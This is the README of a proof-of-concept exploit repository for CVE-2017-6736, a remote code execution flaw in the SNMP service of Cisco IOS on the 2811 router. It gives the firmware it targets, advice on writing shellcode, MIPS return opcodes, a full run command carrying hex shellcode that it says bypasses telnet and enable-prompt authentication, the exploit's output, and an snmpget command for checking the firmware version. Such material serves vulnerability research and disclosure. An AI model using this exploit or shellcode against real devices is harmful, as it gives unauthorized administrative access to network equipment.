CVE-2017-6736 / cisco-sa-20170629-snmp Cisco IOS remote code execution
===================


This repository contains Proof-Of-Concept code for exploiting remote code execution vulnerability in SNMP service disclosed by Cisco Systems on June 29th 2017 - <https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170629-snmp> 


Description
-------------

RCE exploit code is available for Cisco Integrated Service Router 2811. This exploit is firmware dependent. The latest firmware version is supported:

- Cisco IOS Software, 2800 Software (C2800NM-ADVENTERPRISEK9-M), Version 15.1(4)M12a, RELEASE SOFTWARE (fc1)

ROM Monitor version:

- System Bootstrap, Version 12.4(13r)T, RELEASE SOFTWARE (fc1)


Read-only community string is required to trigger the vulnerability. 



Shellcode
------------

The exploit requires shellcode as HEX input. This repo contains an example shellcode for bypassing authentication in telnet service and in enable prompt. Shellcode to revert changes is also available. If you want to write your own shellcode feel free to do so. Just have two things in mind:

- Don't upset the watchdog by running your code for too long. Call a sleep function once in a while.
- Return execution flow back to SNMP service at the end. You can use last opcodes from the demo shellcode:

```
3c1fbfc4    lui $ra, 0xbfc4
37ff89a8    ori $ra, $ra, 0x89a8
03e00008    jr  $ra
00000000    nop
```  


Usage example
-------------

```
$ sudo python c2800nm-adventerprisek9-mz.151-4.M12a.py 192.168.88.1 public 8fb40250000000003c163e2936d655b026d620000000000002d4a821000000008eb60000000000003c1480003694f000ae96000000000000aea00000000000003c1fbfc437ff89a803e0000800000000
Writing shellcode to 0x8000f000
.
Sent 1 packets.
0x8000f0a4: 8fb40250    lw  $s4, 0x250($sp)
.
Sent 1 packets.
0x8000f0a8: 00000000    nop 
.
Sent 1 packets.
0x8000f0ac: 3c163e29    lui $s6, 0x3e29
.
Sent 1 packets.
0x8000f0b0: 36d655b0    ori $s6, $s6, 0x55b0
```

Notes
-----------

Firmware verson can be read via snmpget command:

```
$ snmpget -v 2c -c public 192.168.88.1 1.3.6.1.2.1.1.1.0

SNMPv2-MIB::sysDescr.0 = STRING: Cisco IOS Software, 2800 Software (C2800NM-ADVENTERPRISEK9-M), Version 15.1(4)M12a, RELEASE SOFTWARE (fc1)
Technical Support: http://www.cisco.com/techsupport
Copyright (c) 1986-2016 by Cisco Systems, Inc.
Compiled Tue 04-Oct-16 03:37 by prod_rel_team
```

Author
------

Artem Kondratenko https://twitter.com/artkond
